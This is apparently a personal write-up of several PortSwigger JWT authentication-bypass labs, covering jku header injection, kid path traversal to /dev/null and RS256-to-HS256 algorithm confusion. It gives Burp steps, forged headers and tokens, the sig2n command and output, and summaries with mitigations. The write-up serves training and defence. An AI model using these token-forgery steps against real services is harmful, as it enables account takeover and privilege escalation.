    
</details>





<details>
    <summary>Lab: JWT authentication bypass via jku header injection</summary>

```
eyJraWQiOiJjZmRmYTMyMS00YWZiLTRiZDUtODVlMS1lOTc1ODE3OGM3MTkiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc1NjUxMDAzOSwic3ViIjoid2llbmVyIn0.s_HN8Ym6FyTityp_B97oktH_TDGl0asia1ZBLgOue250fh60YvGcsof55XD7UXBsrodedGLLL_ou60RKuneFFCHFH6LmoGaoDec-866Bgfn7FJNcEuv7gK6Ao6UD0KI-MomyiLC9aA2UJ4N1quA2H_FQjSYj3atSUgETRuQW6VROKuFEEfguFpe4Yn9SOxQbH4gBdHZi_u4oAl1NOwmI3x5RUTw90b9W6FvA3DJUeGUdIsE2RSejEqcgIhP3bjkP4mlh9_Q0m5J7DLpYGXB5_MAjcy064xGNTBMji3yHaIup0tBhcvmNCsZ7M8h9wysUaraRdWCq4LIVEv6wbPkbFA
```

<img width="748" height="718" alt="image" src="https://github.com/user-attachments/assets/3602e8cc-d8b6-4806-96ef-8a1cebb3ef8c" />

----

> ## first we need to create new **`RSA key`** :

<img width="1022" height="566" alt="image" src="https://github.com/user-attachments/assets/4ae83bd0-a868-45e9-9483-ae9c0bf6f933" />

> ## now do **`copy public key as jwk`** and put it on exploit server and click ``store``

<img width="629" height="258" alt="image" src="https://github.com/user-attachments/assets/2d7ac00d-d32b-41f5-ba7f-34877dd31b88" />

<img width="1335" height="375" alt="image" src="https://github.com/user-attachments/assets/fdfb45fa-4583-4b3a-b8b2-b58cd1edeaff" />

```json
{
    "keys": [
        {
    "kty": "RSA",
    "e": "AQAB",
    "kid": "4a39d446-dd24-4c7e-86b8-183a1ac079a0",
    "n": "tb58PeMrMiHDWHPlUgrCVJjiq0oR44e8DN5K0lyJR0pA0qpctF_3_vubDlUL7pkrviNdEeJuVRrvB5nJmGi_q78ahHm-4Ik6eH9r7KFhM22ki4VZFH-kvWMpCBAv_4P8-4Z21ZPhUjxFHAA_PxF0_WawIxgXpNcxm9n_bry2f2zjQg4NX8cA_-WxTR71n9B8BNWbSkcVk6jcmjhj9Q-N1dYbBi1kLjtWH1qqf08icrD5CQ1hV0gGc5x0gOk_6wNAT5pf1u6krvVnkzSHSkwyUAhV9fqjk7-KEfPJ2JCpIudj5WuJh-52m-Sf5fUc3owfpV_w8K-FBJmTDs_K2wg5OQ"
}
    ]
}
```

> ## now take the `"kid"` and `exploit server url`

```
4a39d446-dd24-4c7e-86b8-183a1ac079a0
```

```
https://exploit-0a1d00cb047f301a8160c9ac01d800dd.exploit-server.net/exploit
```

----

> ## change the header in burp suite:
> 1. put the new **`"kid"`**
> 2. set a new key **`"jku"`** with exploite server url
> 3. change user to **`administrator`**

<img width="809" height="695" alt="image" src="https://github.com/user-attachments/assets/10e4f9a0-7568-48eb-8373-3c23fa5170a8" />

```json
{
    "kid": "4a39d446-dd24-4c7e-86b8-183a1ac079a0",
    "alg": "RS256",
    "jku": "https://exploit-0a1d00cb047f301a8160c9ac01d800dd.exploit-server.net/exploit"
}
```

```json
{
    "iss": "portswigger",
    "exp": 1756510039,
    "sub": "administrator"
}
```


> click **`sign`** and send the request



<img width="1594" height="785" alt="image" src="https://github.com/user-attachments/assets/22276224-fe3a-4826-a350-da9a9c154296" />

> change path to **`GET /admin/delete?username=carlos HTTP/2`**

<img width="1521" height="758" alt="image" src="https://github.com/user-attachments/assets/73a69ba9-8e3e-4b91-8916-354155a84fbe" />

    
</details>











<details>
    <summary>Lab: JWT authentication bypass via kid header path traversal</summary>


```json
eyJraWQiOiJlZDZjYmIwYy03MDdhLTQ3MGYtYmYzOS01NjQwOTU3YTYwMGMiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc1NjUxMzY0Mywic3ViIjoid2llbmVyIn0.BwlNCmoE1ZZZu1eXcR_dMRjnfI-NFAvn_-RuVvEzfA0
```

<img width="745" height="680" alt="image" src="https://github.com/user-attachments/assets/147e9e71-80ea-4963-a97c-bb7aa416ecef" />


> ## now try to change **`"kid"`** to **``../../../../../dev/null``**

```json
{
    "kid": "../../../../../dev/null",
    "alg": "HS256"
}
```

> ## so the server will check if the **`k`** equel to the value in **`../../../../../dev/null`** so we need to put the **`k`** empty
> but burp refuse so we can put **``AA==``** instead this is null in base64

<img width="1073" height="591" alt="image" src="https://github.com/user-attachments/assets/4abb0c4a-435b-474f-8486-2d41e917a1af" />

> ## click **`sign`**
> - change user to **`administrator`**

<img width="737" height="568" alt="image" src="https://github.com/user-attachments/assets/4b61e028-0369-45d5-a187-b7035aad516c" />

> ## send the request



<img width="1530" height="759" alt="image" src="https://github.com/user-attachments/assets/652efa50-1b1c-4fe7-b134-a180a6ff4f6b" />

> change path to **`GET /admin/delete?username=carlos HTTP/2`**

<img width="1502" height="728" alt="image" src="https://github.com/user-attachments/assets/315c0911-891d-4e9b-82c1-28d8d0719f6d" />

    
</details>






<details>
    <summary>🟪 Lab: JWT authentication bypass via algorithm confusion</summary>


```json
eyJraWQiOiI1NmJhMDQwMS0wY2YxLTQ2ZWYtYmU3MC1mZjQ2YjRmMDQ4ZDUiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc1NjU3NTQxNSwic3ViIjoid2llbmVyIn0.Fsyamv_6kZjYpwflHMFrYTML2zMm8XBvXQDYD8DagoZBGD-ySWFOT6kYQT_eJYFbM-5Q0Vs-LvOILYB2R_e8VVBLuzpvIMj4M-a8GsKH5z8XNdqdfRBTcYUsOgyD3Xx2FbdBTqWuiWck9MevfjtrHnwKz9FUegrWK_7iQN27jEMdH5xutxpFaFAAYxAavL555BjXpkRSO5ScyGO98pM4fCTUXApckpp1PL5bD3QIXnb0_TLSN_o9WONVC82GlOYMWmHfViLp34QrYv7yLu1fJpbsNud4p311-9itYmHE4tLvXA0gZjKmVDCKYLA7nkn-baatBifpVaZXtM1_hcgnfw
```

---

<img width="743" height="624" alt="image" src="https://github.com/user-attachments/assets/8e455224-e54d-4971-a1d8-9c02c52e658a" />

---

> ## navgaite this path to find the public key: 

```url
/jwks.json
```

<img width="1915" height="191" alt="image" src="https://github.com/user-attachments/assets/5ce7067d-7b54-48c9-a20f-bc0b4c0e3b5c" />

```json
{

   "kty":"RSA",
   "e":"AQAB",
   "use":"sig",
   "kid":"56ba0401-0cf1-46ef-be70-ff46b4f048d5",
"alg":"RS256",
"n":"0qKD9zA7BuRjcJ9sNVDer2ofx9ja0fLGrz11FSy3Tz6R6FOX0oaAIX89YzJY3d38nvQc1zdHsZRgFNsQDWZJeTTlpce_j_6wfCpatzwigNfEsygPmMG27pLC1xAJzEdAv7Z5WITQM8ReJF-2U91qB02a8a5uG3MWPZEX0GTjDZroTTCPEhaDjHeRlRZ10aoUN0P4Bw5zF8s1KorJvU1mq6NzM1_LVxa-lza9yAJ4xDbsjvgJ7mTQoHCRn9fmtNwpzdPJHXEs9LmCfMFGZil6h1haO9yBOz0IHcyL9DMUBRa4b64nUySd44H9QoEaSntrBIxDrdUsHhhdWhi9XsU1GQ"

}
```

> ## go to **``JWT editor``** click generate **RSA key** and paste the publick key 

<img width="1906" height="624" alt="image" src="https://github.com/user-attachments/assets/0d12fc3f-b762-46d2-b964-78f6d4f637e3" />

> ## now click **`copy public key as PEM`**

<img width="891" height="367" alt="image" src="https://github.com/user-attachments/assets/1a62ed7c-865a-462b-adf3-badc59b3f68b" />

```
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0qKD9zA7BuRjcJ9sNVDe
r2ofx9ja0fLGrz11FSy3Tz6R6FOX0oaAIX89YzJY3d38nvQc1zdHsZRgFNsQDWZJ
eTTlpce/j/6wfCpatzwigNfEsygPmMG27pLC1xAJzEdAv7Z5WITQM8ReJF+2U91q
B02a8a5uG3MWPZEX0GTjDZroTTCPEhaDjHeRlRZ10aoUN0P4Bw5zF8s1KorJvU1m
q6NzM1/LVxa+lza9yAJ4xDbsjvgJ7mTQoHCRn9fmtNwpzdPJHXEs9LmCfMFGZil6
h1haO9yBOz0IHcyL9DMUBRa4b64nUySd44H9QoEaSntrBIxDrdUsHhhdWhi9XsU1
GQIDAQAB
-----END PUBLIC KEY-----
```

> ## go to **`Decoder`** and encode it to ``base64``

<img width="1899" height="433" alt="image" src="https://github.com/user-attachments/assets/9d50a579-9a4f-49bd-9095-935aa209500e" />

```base64
LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUEwcUtEOXpBN0J1UmpjSjlzTlZEZQpyMm9meDlqYTBmTEdyejExRlN5M1R6NlI2Rk9YMG9hQUlYODlZekpZM2QzOG52UWMxemRIc1pSZ0ZOc1FEV1pKCmVUVGxwY2Uvai82d2ZDcGF0endpZ05mRXN5Z1BtTUcyN3BMQzF4QUp6RWRBdjdaNVdJVFFNOFJlSkYrMlU5MXEKQjAyYThhNXVHM01XUFpFWDBHVGpEWnJvVFRDUEVoYURqSGVSbFJaMTBhb1VOMFA0Qnc1ekY4czFLb3JKdlUxbQpxNk56TTEvTFZ4YStsemE5eUFKNHhEYnNqdmdKN21UUW9IQ1JuOWZtdE53cHpkUEpIWEVzOUxtQ2ZNRkdaaWw2CmgxaGFPOXlCT3owSUhjeUw5RE1VQlJhNGI2NG5VeVNkNDRIOVFvRWFTbnRyQkl4RHJkVXNIaGhkV2hpOVhzVTEKR1FJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tUwo=
```

> ## now create new **`symetric key`** replace the **`k`** value to **`base64`**

<img width="1027" height="649" alt="image" src="https://github.com/user-attachments/assets/e0385aee-d2b2-4139-94e1-820f7b0f14eb" />


> ## now we can used the ``public key`` as ``secet key``

> ## now go back to repeater change the jwt header and payload :

## **`from`**

```json
{
    "kid": "56ba0401-0cf1-46ef-be70-ff46b4f048d5",
    "alg": "RS256"
}

{
    "iss": "portswigger",
    "exp": 1756575415,
    "sub": "wiener"
}
```

## **`To`**

```json
{
    "kid": "56ba0401-0cf1-46ef-be70-ff46b4f048d5",
    "alg": "HS256"
}

{
    "iss": "portswigger",
    "exp": 1756575415,
    "sub": "administrator"
}

```


> ## click **`sign`** button 

 <img width="1053" height="548" alt="image" src="https://github.com/user-attachments/assets/34ca7b0c-5166-40cd-93c0-dea6c4929f04" />

> ## send the request

<img width="1507" height="738" alt="image" src="https://github.com/user-attachments/assets/66402479-c12b-4cf3-bbee-4f1060d4bc75" />


> change path to **`GET /admin/delete?username=carlos HTTP/2`**

<img width="1520" height="750" alt="image" src="https://github.com/user-attachments/assets/d7b5a639-6418-44db-9dbb-f1ad39250aed" />





- <details>
    <summary>summary</summary>


    
    
    
    # JWT Algorithm Confusion Attack (RS256 → HS256)
    
    ## 📌 Summary
    
    This attack exploits a misconfiguration in JWT verification where the server allows the algorithm to be chosen from the token header. By switching from **RS256** (asymmetric) to **HS256** (symmetric), the public key can be abused as the HMAC secret.
    
    ---
    
    ## 🔑 Steps
    
    1. **Identify algorithm used**
       - Original token header:
         ```json
         { "kid": "...", "alg": "RS256" }
         ```
    
    2. **Retrieve public key**
       - Extracted from server's **JWK Set** or endpoint.
    
    3. **Convert public key**
       - Save as PEM format.
       - Base64 encode it to be used as a string secret.
    
    4. **Modify token**
       - Change algorithm in header:
         ```json
         { "kid": "...", "alg": "HS256" }
         ```
       - Modify payload:
         ```json
         { "sub": "administrator" }
         ```
    
    5. **Sign the token**
       - Use the public key as the HMAC secret with HS256.
    
    6. **Exploit**
       - Send the forged JWT to the server.
       - The server validates it successfully, granting **admin privileges**.
    
       Example request:
       ```http
       GET /admin/delete?username=carlos HTTP/1.1
       Host: vulnerable-app.com
       Cookie: session=<forged_token>
       ```
    
    ---
    
    ## ✅ Why it works
    - RS256 = asymmetric (private key to sign, public key to verify).
    - HS256 = symmetric (same key for signing & verifying).
    - If the server doesn’t enforce RS256, switching to HS256 makes the server treat the **public key** as the secret, enabling forgery.
    
    ---
    
    ## ⚠️ Impact
    - Full account takeover.
    - Privilege escalation to administrator.
    - Arbitrary actions on behalf of other users.
    
    ---
    
    ## 🛡️ Mitigation
    - Do **not** allow algorithm from untrusted token header.
    - Enforce a strict algorithm (e.g., RS256).
    - Rotate compromised keys immediately.
    
    


    
  </details>





    
</details>








<details>
    <summary>🟪 Lab: JWT authentication bypass via algorithm confusion with no exposed key</summary>


1. login to **`wiener : peter`** twoice to take two JWT tokens 

```json
eyJraWQiOiJlYzY1OTM4Ny02NWE0LTQyZTgtYmYyMC1iNGU3NDcxN2UwNmYiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc1NjU5NTEzMSwic3ViIjoid2llbmVyIn0.KeeaoSqHIwRjoU5yG2z7zGJPjMP9RrDZsRkcKrSOmw1wE9qJKq80YV5gUgJ9FYT8SH8vBcAhwstWk1MlJERFKbfx1Jd-3i10fsdL1mupXdI4vJGsaumM9qfkFb-Rxy0dofay-Y4up-dDdJXxSNeMNx-3sp-j0nih1MEw6CcWQKFRNm3_qW28UB4fCGx9blYaTwqWEzSYG0itbOtnfTcqLbtKsOvBIbla8IGYVfIot-9l6zduDTCpU3gAFSFOBg_FfZoT6iz0ifMztK5B-CYewPECdrN9Zgzf1QYGpDRCcA0EjfjRBRG26r3Xic5JkGxWFtZLKPrLh6Zp7qrDBqLnLg
```

```json
eyJraWQiOiJlYzY1OTM4Ny02NWE0LTQyZTgtYmYyMC1iNGU3NDcxN2UwNmYiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc1NjU5NTE3Mywic3ViIjoid2llbmVyIn0.AHCl5w7dC41pvq228zEmHkQnlvESeHhsoyzuxGCplpuYX7GtXoZC6NRHHD3D8R5rydl8ckrp2l3vV7RM5UqEVXMRpA7OnsDVNrSwMHyAtNQBQ1iGSCUw3H1kZFqVATrDxU0eioVaNuWsz2pGoxdDMeZX0RmNnEzciWlnI4HI3An-O995ianoBinrOXPN05LusA4cTO-S7Zt-lBJzq7Cs2cmcg1sDMpba6X-8Bt-8A__syw7jZUmHAvFzlz0NDGWLPJ0HtGQdKSXRxi3uYcIXT9EhqfPPbR_PRN9rPrddFYpHJiui5xJ0D3FxgfOXe0LqI-0_kwU2NNI4Dj_HGATQJQ
```

--- 

> ## after that use this tool form portswigger :

```bash
sudo docker run --rm -it portswigger/sig2n <token_1> <token_2>
```

<img width="1331" height="631" alt="image" src="https://github.com/user-attachments/assets/24728a4b-ae55-42c9-8f1c-01b5d8d808b5" />


```ruby
Found n with multiplier 1:
    Base64 encoded x509 key: LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUF2azBjT0JOVy9FdDNpN3IrYmtZeQpoa0Rpa0FRYTM1SXFGN1duVzZFMjlzZ01PTkJlcXJZaWdmUVB1N05DbEl6YXYrd3Y1QjVzaGs0RTdyQTFOcmNHCkxrbzBiSnA3SzhDR2NVbStKZW9XSUxyNTlOd0NQNzJhaDloUEd0bmJVRnhESjN6K3c2M1ZtV05PQWY1WEJmYzYKd3ZJRmVTVFh2ZVJnU0NsWno3ZFFwTEdrK2ltbWFoNWkrTHc1MDZBbXRjNE1iRWVwL0hacjFycXFqa1NqR1lMcwp1ZmNGTTZRWncrbGd1STVHT1BIVmJhMlBVYmU5KzRlZlUzb2ptMlE2Um9MU3JheWdkWVNsbDg0bzJpQ1hMSXhBCkwwTUZONG1TSEVUVy9vSG00S0tuaU41ZldNeG5iZ0IwOTVNQnFrekZTcWtHV0EySENOVncwKzBOS1VLaEhIYncKS3dJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg==
    Tampered JWT: eyJraWQiOiJlYzY1OTM4Ny02NWE0LTQyZTgtYmYyMC1iNGU3NDcxN2UwNmYiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiAicG9ydHN3aWdnZXIiLCAiZXhwIjogMTc1NjY3ODExMywgInN1YiI6ICJ3aWVuZXIifQ.EyjdH6rqJVnP_-WdCu1ntdNC2VXIi4heh7-08vGBSRY




 Base64 encoded pkcs1 key: LS0tLS1CRUdJTiBSU0EgUFVCTElDIEtFWS0tLS0tCk1JSUJDZ0tDQVFFQXZrMGNPQk5XL0V0M2k3citia1l5aGtEaWtBUWEzNUlxRjdXblc2RTI5c2dNT05CZXFyWWkKZ2ZRUHU3TkNsSXphdit3djVCNXNoazRFN3JBMU5yY0dMa28wYkpwN0s4Q0djVW0rSmVvV0lMcjU5TndDUDcyYQpoOWhQR3RuYlVGeERKM3ordzYzVm1XTk9BZjVYQmZjNnd2SUZlU1RYdmVSZ1NDbFp6N2RRcExHaytpbW1haDVpCitMdzUwNkFtdGM0TWJFZXAvSFpyMXJxcWprU2pHWUxzdWZjRk02UVp3K2xndUk1R09QSFZiYTJQVWJlOSs0ZWYKVTNvam0yUTZSb0xTcmF5Z2RZU2xsODRvMmlDWExJeEFMME1GTjRtU0hFVFcvb0htNEtLbmlONWZXTXhuYmdCMAo5NU1CcWt6RlNxa0dXQTJIQ05WdzArME5LVUtoSEhid0t3SURBUUFCCi0tLS0tRU5EIFJTQSBQVUJMSUMgS0VZLS0tLS0K
    Tampered JWT: eyJraWQiOiJlYzY1OTM4Ny02NWE0LTQyZTgtYmYyMC1iNGU3NDcxN2UwNmYiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiAicG9ydHN3aWdnZXIiLCAiZXhwIjogMTc1NjY3ODExMywgInN1YiI6ICJ3aWVuZXIifQ.GV3wq7HJ_sy7iRRJHEvAKBox9nWf8DL9XlGh4E_kbWM

```


> ## founded 2 tokens **`x509`** and **`pkcs1`** from hint we know that it it `x509` but in real world you will try all tokens untill on success

<img width="1040" height="147" alt="image" src="https://github.com/user-attachments/assets/87b35aba-6af3-48db-9f42-35a3fa490644" />

```ruby
    Base64 encoded x509 key: LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUF2azBjT0JOVy9FdDNpN3IrYmtZeQpoa0Rpa0FRYTM1SXFGN1duVzZFMjlzZ01PTkJlcXJZaWdmUVB1N05DbEl6YXYrd3Y1QjVzaGs0RTdyQTFOcmNHCkxrbzBiSnA3SzhDR2NVbStKZW9XSUxyNTlOd0NQNzJhaDloUEd0bmJVRnhESjN6K3c2M1ZtV05PQWY1WEJmYzYKd3ZJRmVTVFh2ZVJnU0NsWno3ZFFwTEdrK2ltbWFoNWkrTHc1MDZBbXRjNE1iRWVwL0hacjFycXFqa1NqR1lMcwp1ZmNGTTZRWncrbGd1STVHT1BIVmJhMlBVYmU5KzRlZlUzb2ptMlE2Um9MU3JheWdkWVNsbDg0bzJpQ1hMSXhBCkwwTUZONG1TSEVUVy9vSG00S0tuaU41ZldNeG5iZ0IwOTVNQnFrekZTcWtHV0EySENOVncwKzBOS1VLaEhIYncKS3dJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg==
    Tampered JWT: eyJraWQiOiJlYzY1OTM4Ny02NWE0LTQyZTgtYmYyMC1iNGU3NDcxN2UwNmYiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiAicG9ydHN3aWdnZXIiLCAiZXhwIjogMTc1NjY3ODExMywgInN1YiI6ICJ3aWVuZXIifQ.EyjdH6rqJVnP_-WdCu1ntdNC2VXIi4heh7-08vGBSRY
```


> ## now let's try to put then new jwt and see or to make sure it true:

<img width="1491" height="739" alt="image" src="https://github.com/user-attachments/assets/3b6d7537-ea85-470c-9867-00bcd2dc53f8" />

> ## after we make sure let's make new **`symetric key`** and change it's **`k`** value with **`base64 encoded x509 key`**

<img width="816" height="619" alt="image" src="https://github.com/user-attachments/assets/c0bc7104-0cd8-4595-8aa5-da983e57785f" />

> ## go to repeater to reqest and change :
> - path to **`/admin`**
> - user to **`administrator`**
> - click sign and choose the **`new symmetric key`**

<img width="988" height="761" alt="image" src="https://github.com/user-attachments/assets/94cc9ad1-ec5d-4c09-b4ba-d554f135fb83" />

> ## send the request 

<img width="1521" height="707" alt="image" src="https://github.com/user-attachments/assets/e2f83638-f78c-4a55-b55e-824fba103adf" />

> change path to **`GET /admin/delete?username=carlos HTTP/2`**

<img width="1543" height="730" alt="image" src="https://github.com/user-attachments/assets/6a0ee703-3173-4662-92e8-cda37cfaa913" />





- <details>
     <summary>summary</summary>





    
    # 🔐 PortSwigger Lab Write-up: Algorithm Confusion Attack with sig2n
    
    ## 📌 Steps to Solve
    
    ### 1. Extract JWT Tokens
    - Logged in as **wiener:peter**.  
    - Obtained two different JWT tokens from the application.  
    - Having two tokens allowed extraction of the **public key**.
    
    ---
    
    ### 2. Extract Public Key with sig2n
    - Ran PortSwigger's **sig2n** tool via Docker:
      ```bash
      sudo docker run --rm -it portswigger/sig2n <token_1> <token_2>
      ```
    - The tool derived the **modulus (n)** from the tokens and output multiple possible keys:
      - **Base64 encoded x509 key**
      - **Base64 encoded pkcs1 key**
      - Pre-generated **tampered JWTs**
    
    > In the lab we knew that the **x509 key** was correct, but in a real-world case you’d test each possibility until one works.
    
    ---
    
    ### 3. Configure New Key in Burp
    - Verified the tampered JWT works in the app.  
    - Opened **Burp → JWT Editor Keys**.  
    - Created a **symmetric key**.  
    - Replaced the key value `k` with the **Base64 encoded x509 key**.
    
    ---
    
    ### 4. Forge and Re-sign JWT
    - Opened the token in **JWT Editor**.  
    - Modified the claim:
      - `sub` → changed from **wiener** to **administrator**.  
    - Selected the symmetric key.  
    - Re-signed the token using **HS256**.
    
    ---
    
    ### 5. Exploit Admin Access
    - Sent modified request to `/admin` instead of `/my-account`.  
    - Gained **administrator privileges**.  
    - Executed the following request:
      ```http
      GET /admin/delete?username=carlos HTTP/2
      ```
    - Successfully deleted **carlos** and solved the lab ✅.
    
    ---
    
    ## 🎯 Conclusion
    This was an **Algorithm Confusion Attack**:  
    - Server expected **RS256** (asymmetric signing).  
    - We tricked it into accepting **HS256** (symmetric).  
    - Used the **public key as the secret** to sign forged JWTs.  
    - Escalated privileges and performed admin actions.
    
    ---







  </details>


    
</details>















































